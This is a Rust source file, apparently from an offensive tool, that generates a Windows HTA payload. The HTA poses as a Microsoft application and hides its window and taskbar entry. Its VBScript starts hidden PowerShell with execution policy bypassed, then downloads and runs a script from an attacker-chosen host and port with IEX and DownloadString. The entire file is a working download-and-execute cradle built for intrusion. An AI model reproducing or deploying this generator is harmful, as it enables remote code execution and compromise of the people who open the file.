// Windows HTA payload generator
use crate::cli::banner;

pub struct HtaGenerator;

impl HtaGenerator {
    pub fn new() -> Self { Self }
    
    pub fn generate(&self, lhost: &str, lport: &str) -> String {
        banner::print_exploiting("HTA-PAYLOAD", &format!("{}:{}", lhost, lport));
        
        format!(
            r#"<HTA:APPLICATION ID="Microsoft Internet Explorer" APPLICATIONNAME="Windows Host Application" BORDER="none" CAPTION="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" SYSMENU="no" WINDOWSTATE="maximize">
<script language="VBScript">
Set objShell = CreateObject("WScript.Shell")
command = "powershell -nop -w hidden -exec bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://{}:{}/payload.ps1')"""
objShell.Run command, 0, False
</script>"#,
            lhost, lport
        )
    }
}
